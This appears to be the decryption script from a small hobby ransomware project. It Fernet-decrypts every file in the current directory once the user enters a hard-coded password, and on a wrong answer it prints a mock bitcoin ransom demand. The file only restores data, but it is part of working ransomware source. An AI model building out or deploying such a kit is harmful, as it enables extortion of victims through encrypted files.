import os
from cryptography.fernet import Fernet 
files = []

for file in os.listdir():
	if file == "cruella.py" or \
	file == "thekey.key" or \
	file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)


with open("thekey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "lesbians"
user_phrase = input("Enter the password!\n")
if user_phrase == secretphrase:

	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		content_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(content_decrypted)
	print("congrats your files are back!")
else:
	print("Wrong! send more bitcoinzzz")


